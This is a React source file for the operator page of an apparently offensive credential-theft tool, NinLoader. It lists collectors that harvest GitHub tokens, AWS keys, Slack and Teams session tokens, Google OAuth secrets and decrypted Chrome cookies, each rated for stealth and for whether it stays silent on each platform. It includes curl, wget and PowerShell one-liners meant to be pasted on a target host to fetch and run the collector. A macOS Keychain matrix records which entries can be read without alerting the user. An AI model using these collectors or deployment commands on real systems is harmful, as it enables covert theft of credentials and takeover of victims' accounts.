"use client"

import { useState, useEffect } from "react"
import {
  Package,
  Download,
  Terminal,
  Shield,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Copy,
  ChevronDown,
  ChevronRight,
  FileCode,
} from "lucide-react"

type Collector = {
  service: string
  source: string
  platforms: string[]
  stealth: number
  status: "active" | "stub" | "experimental"
  description: string
  opsec: {
    macos: "silent" | "prompt" | "n/a"
    windows: "silent" | "prompt" | "n/a"
    linux: "silent" | "prompt" | "n/a"
  }
  command: string
}

const collectors: Collector[] = [
  {
    service: "Google",
    source: "adc",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "Application Default Credentials (~/.config/gcloud/application_default_credentials.json)",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service google --source adc",
  },
  {
    service: "Google",
    source: "gcloud",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "gcloud SQLite credentials.db — GCP scopes only (cloud-platform, compute), NOT Workspace",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service google --source gcloud",
  },
  {
    service: "Google",
    source: "gws_cli",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 3,
    status: "active",
    description: "GWS OAuth via stolen ~/.config/gws/client_secret.json — Gmail, Drive, Calendar, Admin scopes. Opens browser tab for consent.",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service google --source gws_cli",
  },
  {
    service: "Google",
    source: "browser_hijack",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 4,
    status: "experimental",
    description: "Chrome profile copy + CDP auto-click. Sessions revoked by Google within ~5s — use gws_cli instead.",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service google --source browser_hijack",
  },
  {
    service: "GitHub",
    source: "gh_cli",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "GitHub CLI PAT from Keychain (macOS), Credential Manager (Windows), or YAML/pass (Linux)",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service github --source gh_cli",
  },
  {
    service: "GitHub",
    source: "git_credentials",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "~/.git-credentials file (URL-format tokens)",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service github --source git_credentials",
  },
  {
    service: "Microsoft",
    source: "teams_desktop",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "Teams desktop LevelDB cache — JWT access/skype tokens",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service microsoft --source teams_desktop",
  },
  {
    service: "Microsoft",
    source: "device_code",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 3,
    status: "active",
    description: "FOCI device code flow — exchange tokens across Teams/Office/Outlook/OneDrive. Requires msal package.",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service microsoft --source device_code",
  },
  {
    service: "Slack",
    source: "desktop",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "Slack desktop LevelDB — xoxc session tokens (requires d_cookie for API access)",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service slack --source desktop",
  },
  {
    service: "AWS",
    source: "credentials",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "~/.aws/credentials — IAM access key + secret",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service aws --source credentials",
  },
  {
    service: "AWS",
    source: "env",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY environment variables",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service aws --source env",
  },
  {
    service: "AWS",
    source: "sso_cache",
    platforms: ["macOS", "Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "~/.aws/sso/cache/*.json — active AWS SSO sessions",
    opsec: { macos: "silent", windows: "silent", linux: "silent" },
    command: "ninloader collect --service aws --source sso_cache",
  },
  {
    service: "Chromium",
    source: "cookie_decrypt",
    platforms: ["Windows", "Linux"],
    stealth: 5,
    status: "active",
    description: "Decrypt Chrome cookies — extract Google/Microsoft/Slack/GitHub sessions. Silent on Windows (DPAPI) and Linux (peanuts). macOS requires Keychain prompt.",
    opsec: { macos: "prompt", windows: "silent", linux: "silent" },
    command: "ninloader collect --service chromium --source cookie_decrypt",
  },
]

const keychainMatrix = [
  { entry: "gh:github.com", prompt: false, verified: true, notes: "GitHub CLI PAT — extracted successfully" },
  { entry: "Chrome Safe Storage", prompt: true, verified: true, notes: "Triggers visible dialog — user denied in testing" },
  { entry: "gws-cli", prompt: true, verified: true, notes: "Triggers visible dialog — GWS token cache key" },
  { entry: "Slack Safe Storage", prompt: true, verified: false, notes: "Likely prompts (Chromium-based app)" },
  { entry: "Microsoft Teams Safe Storage", prompt: true, verified: false, notes: "Likely prompts (Chromium-based app)" },
  { entry: "Tunnelblick Management Password", prompt: true, verified: false, notes: "VPN credentials — verify before use" },
  { entry: "FortiClient Safe Storage", prompt: true, verified: false, notes: "VPN encryption key — verify before use" },
  { entry: "cursor-access-token", prompt: null, verified: false, notes: "Cursor IDE — untested" },
  { entry: "Evernote", prompt: null, verified: false, notes: "Session auth token — untested" },
]

function StealthBadge({ score }: { score: number }) {
  const colors = {
    5: "bg-emerald-900/50 text-emerald-400 border-emerald-800",
    4: "bg-teal-900/50 text-teal-400 border-teal-800",
    3: "bg-amber-900/50 text-amber-400 border-amber-800",
    2: "bg-orange-900/50 text-orange-400 border-orange-800",
    1: "bg-red-900/50 text-red-400 border-red-800",
  }
  return (
    <span className={`rounded border px-1.5 py-0.5 text-[10px] font-mono ${colors[score as keyof typeof colors] || colors[1]}`}>
      {score}/5
    </span>
  )
}

function StatusBadge({ status }: { status: string }) {
  if (status === "active") return <span className="rounded bg-emerald-900/50 px-1.5 py-0.5 text-[10px] text-emerald-400">Active</span>
  if (status === "experimental") return <span className="rounded bg-amber-900/50 px-1.5 py-0.5 text-[10px] text-amber-400">Experimental</span>
  return <span className="rounded bg-neutral-800 px-1.5 py-0.5 text-[10px] text-neutral-500">Stub</span>
}

function OpsecIcon({ level }: { level: "silent" | "prompt" | "n/a" | null }) {
  if (level === "silent") return <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
  if (level === "prompt") return <AlertTriangle className="h-3.5 w-3.5 text-amber-500" />
  if (level === "n/a") return <span className="text-[10px] text-neutral-600">n/a</span>
  return <XCircle className="h-3.5 w-3.5 text-neutral-600" />
}

export default function StudioCollectionPage() {
  const [expandedCmd, setExpandedCmd] = useState<string | null>(null)
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)
  const [filter, setFilter] = useState<string>("all")
  const [origin, setOrigin] = useState<string>("")
  const [showOneLiners, setShowOneLiners] = useState(false)

  useEffect(() => {
    setOrigin(window.location.origin)
  }, [])

  const filtered = filter === "all" ? collectors : collectors.filter((c) => c.service.toLowerCase() === filter)
  const services = [...new Set(collectors.map((c) => c.service))]

  const copyCommand = (cmd: string) => {
    navigator.clipboard.writeText(cmd)
    setCopiedCmd(cmd)
    setTimeout(() => setCopiedCmd(null), 2000)
  }

  return (
    <div className="flex flex-col gap-6 overflow-y-auto">
      {/* Header */}
      <div>
        <div className="flex items-center gap-3">
          <Package className="h-6 w-6 text-red-500" />
          <h1 className="text-xl font-bold text-neutral-100">Collection Reference</h1>
        </div>
        <p className="mt-1 text-sm text-neutral-400">
          NinLoader token extraction reference — supported collectors, OPSEC profiles, and Keychain behavior per platform.
        </p>
      </div>

      {/* NinLoader Download */}
      <div className="rounded-lg border border-neutral-800 bg-neutral-900/50 p-4 space-y-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Download className="h-5 w-5 text-red-500" />
            <div>
              <h2 className="text-sm font-semibold text-neutral-200">NinLoader CLI</h2>
              <p className="text-xs text-neutral-500">Universal token collector — Python + PowerShell</p>
            </div>
          </div>
          <div className="flex gap-2">
            <a
              href="/api/ninloader/download?type=python"
              download="ninloader.tar.gz"
              className="flex items-center gap-1.5 rounded border border-neutral-700 px-3 py-1.5 text-xs text-neutral-300 hover:border-emerald-600 hover:text-emerald-400 transition-colors"
            >
              <FileCode className="h-3 w-3" />
              Python (.tar.gz)
            </a>
            <a
              href="/api/ninloader/download?type=powershell"
              download="NinLoader.ps1"
              className="flex items-center gap-1.5 rounded border border-neutral-700 px-3 py-1.5 text-xs text-neutral-300 hover:border-blue-600 hover:text-blue-400 transition-colors"
            >
              <FileCode className="h-3 w-3" />
              PowerShell (.ps1)
            </a>
            <button
              onClick={() => setShowOneLiners(!showOneLiners)}
              className="flex items-center gap-1.5 rounded border border-neutral-700 px-3 py-1.5 text-xs text-neutral-300 hover:border-neutral-500 transition-colors"
            >
              <Terminal className="h-3 w-3" />
              One-liners
              {showOneLiners ? <ChevronDown className="h-3 w-3" /> : <ChevronRight className="h-3 w-3" />}
            </button>
          </div>
        </div>

        {/* One-liner deployment commands */}
        {showOneLiners && origin && (
          <div className="space-y-3 border-t border-neutral-800 pt-4">
            <p className="text-xs text-neutral-500">
              Remote deployment — paste on target host to download and run NinLoader directly.
            </p>

            {/* Python one-liner */}
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono text-emerald-500 uppercase tracking-wider">Python (Linux/macOS)</span>
              </div>
              <div className="flex items-center gap-2 rounded border border-neutral-800 bg-black/50 px-3 py-2">
                <code className="flex-1 text-xs font-mono text-neutral-300 break-all select-all">
                  curl -sL {origin}/api/ninloader/download?type=python | tar xz &amp;&amp; cd ninloader &amp;&amp; python3 ninloader.py discover
                </code>
                <button
                  onClick={() =>
                    copyCommand(
                      `curl -sL ${origin}/api/ninloader/download?type=python | tar xz && cd ninloader && python3 ninloader.py discover`
                    )
                  }
                  className="shrink-0 text-neutral-500 hover:text-neutral-300"
                >
                  {copiedCmd ===
                  `curl -sL ${origin}/api/ninloader/download?type=python | tar xz && cd ninloader && python3 ninloader.py discover` ? (
                    <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
                  ) : (
                    <Copy className="h-3.5 w-3.5" />
                  )}
                </button>
              </div>
            </div>

            {/* PowerShell one-liner */}
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono text-blue-500 uppercase tracking-wider">PowerShell (Windows)</span>
              </div>
              <div className="flex items-center gap-2 rounded border border-neutral-800 bg-black/50 px-3 py-2">
                <code className="flex-1 text-xs font-mono text-neutral-300 break-all select-all">
                  iwr {origin}/api/ninloader/download?type=powershell -OutFile NinLoader.ps1; .\NinLoader.ps1 -Discover
                </code>
                <button
                  onClick={() =>
                    copyCommand(
                      `iwr ${origin}/api/ninloader/download?type=powershell -OutFile NinLoader.ps1; .\\NinLoader.ps1 -Discover`
                    )
                  }
                  className="shrink-0 text-neutral-500 hover:text-neutral-300"
                >
                  {copiedCmd ===
                  `iwr ${origin}/api/ninloader/download?type=powershell -OutFile NinLoader.ps1; .\\NinLoader.ps1 -Discover` ? (
                    <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
                  ) : (
                    <Copy className="h-3.5 w-3.5" />
                  )}
                </button>
              </div>
            </div>

            {/* wget alternative */}
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono text-amber-500 uppercase tracking-wider">wget alternative (Linux)</span>
              </div>
              <div className="flex items-center gap-2 rounded border border-neutral-800 bg-black/50 px-3 py-2">
                <code className="flex-1 text-xs font-mono text-neutral-300 break-all select-all">
                  wget -qO- {origin}/api/ninloader/download?type=python | tar xz &amp;&amp; cd ninloader &amp;&amp; python3 ninloader.py discover
                </code>
                <button
                  onClick={() =>
                    copyCommand(
                      `wget -qO- ${origin}/api/ninloader/download?type=python | tar xz && cd ninloader && python3 ninloader.py discover`
                    )
                  }
                  className="shrink-0 text-neutral-500 hover:text-neutral-300"
                >
                  {copiedCmd ===
                  `wget -qO- ${origin}/api/ninloader/download?type=python | tar xz && cd ninloader && python3 ninloader.py discover` ? (
                    <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
                  ) : (
                    <Copy className="h-3.5 w-3.5" />
                  )}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Filter */}
      <div className="flex items-center gap-2">
        <button
          onClick={() => setFilter("all")}
          className={`rounded px-2.5 py-1 text-xs ${filter === "all" ? "bg-red-900/50 text-red-400" : "text-neutral-500 hover:text-neutral-300"}`}
        >
          All ({collectors.length})
        </button>
        {services.map((s) => (
          <button
            key={s}
            onClick={() => setFilter(s.toLowerCase())}
            className={`rounded px-2.5 py-1 text-xs ${filter === s.toLowerCase() ? "bg-red-900/50 text-red-400" : "text-neutral-500 hover:text-neutral-300"}`}
          >
            {s} ({collectors.filter((c) => c.service === s).length})
          </button>
        ))}
      </div>

      {/* Collectors Table */}
      <div className="rounded-lg border border-neutral-800 overflow-hidden">
        <table className="w-full text-xs">
          <thead>
            <tr className="border-b border-neutral-800 bg-neutral-900/80 text-neutral-500">
              <th className="px-3 py-2 text-left font-medium">Service</th>
              <th className="px-3 py-2 text-left font-medium">Source</th>
              <th className="px-3 py-2 text-center font-medium">Stealth</th>
              <th className="px-3 py-2 text-center font-medium">Status</th>
              <th className="px-3 py-2 text-center font-medium" title="macOS">macOS</th>
              <th className="px-3 py-2 text-center font-medium" title="Windows">Win</th>
              <th className="px-3 py-2 text-center font-medium" title="Linux">Linux</th>
              <th className="px-3 py-2 text-left font-medium">Description</th>
            </tr>
          </thead>
          <tbody>
            {filtered.map((c) => (
              <tr
                key={`${c.service}-${c.source}`}
                className="border-b border-neutral-800/50 hover:bg-neutral-900/30 cursor-pointer"
                onClick={() => setExpandedCmd(expandedCmd === c.command ? null : c.command)}
              >
                <td className="px-3 py-2 font-medium text-neutral-300">{c.service}</td>
                <td className="px-3 py-2 font-mono text-neutral-400">{c.source}</td>
                <td className="px-3 py-2 text-center"><StealthBadge score={c.stealth} /></td>
                <td className="px-3 py-2 text-center"><StatusBadge status={c.status} /></td>
                <td className="px-3 py-2 text-center"><OpsecIcon level={c.opsec.macos} /></td>
                <td className="px-3 py-2 text-center"><OpsecIcon level={c.opsec.windows} /></td>
                <td className="px-3 py-2 text-center"><OpsecIcon level={c.opsec.linux} /></td>
                <td className="px-3 py-2 text-neutral-500">{c.description}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Expanded Command */}
      {expandedCmd && (
        <div className="flex items-center gap-2 rounded border border-neutral-800 bg-black/50 px-3 py-2">
          <Terminal className="h-3.5 w-3.5 text-neutral-500 shrink-0" />
          <code className="flex-1 text-xs font-mono text-emerald-400">{expandedCmd}</code>
          <button onClick={() => copyCommand(expandedCmd)} className="shrink-0 text-neutral-500 hover:text-neutral-300">
            {copiedCmd === expandedCmd ? <CheckCircle className="h-3.5 w-3.5 text-emerald-500" /> : <Copy className="h-3.5 w-3.5" />}
          </button>
        </div>
      )}

      {/* OPSEC: Keychain Prompt Matrix */}
      <div>
        <div className="flex items-center gap-2 mb-3">
          <Shield className="h-5 w-5 text-amber-500" />
          <h2 className="text-sm font-semibold text-neutral-200">macOS Keychain OPSEC Matrix</h2>
        </div>
        <p className="text-xs text-neutral-500 mb-3">
          Some Keychain entries trigger a <span className="text-amber-400">visible authorization dialog</span> when read via{" "}
          <code className="text-neutral-400">security find-generic-password -w</code>. This is determined by the app&apos;s Keychain ACL.
          Always verify before extracting in production.
        </p>
        <div className="rounded-lg border border-neutral-800 overflow-hidden">
          <table className="w-full text-xs">
            <thead>
              <tr className="border-b border-neutral-800 bg-neutral-900/80 text-neutral-500">
                <th className="px-3 py-2 text-left font-medium">Keychain Entry</th>
                <th className="px-3 py-2 text-center font-medium">Triggers Prompt?</th>
                <th className="px-3 py-2 text-center font-medium">Verified</th>
                <th className="px-3 py-2 text-left font-medium">Notes</th>
              </tr>
            </thead>
            <tbody>
              {keychainMatrix.map((k) => (
                <tr key={k.entry} className="border-b border-neutral-800/50">
                  <td className="px-3 py-2 font-mono text-neutral-300">{k.entry}</td>
                  <td className="px-3 py-2 text-center">
                    {k.prompt === false && <span className="text-emerald-400">No (silent)</span>}
                    {k.prompt === true && <span className="text-amber-400">Yes (visible)</span>}
                    {k.prompt === null && <span className="text-neutral-600">Unknown</span>}
                  </td>
                  <td className="px-3 py-2 text-center">
                    {k.verified ? <CheckCircle className="inline h-3.5 w-3.5 text-emerald-500" /> : <span className="text-neutral-600">-</span>}
                  </td>
                  <td className="px-3 py-2 text-neutral-500">{k.notes}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Legend */}
      <div className="flex flex-wrap gap-4 text-[10px] text-neutral-600">
        <span className="flex items-center gap-1"><CheckCircle className="h-3 w-3 text-emerald-500" /> Silent (no user interaction)</span>
        <span className="flex items-center gap-1"><AlertTriangle className="h-3 w-3 text-amber-500" /> Triggers prompt (visible to user)</span>
        <span>Stealth: 5 = file read only, 3 = interactive/network, 1 = high detection risk</span>
      </div>
    </div>
  )
}
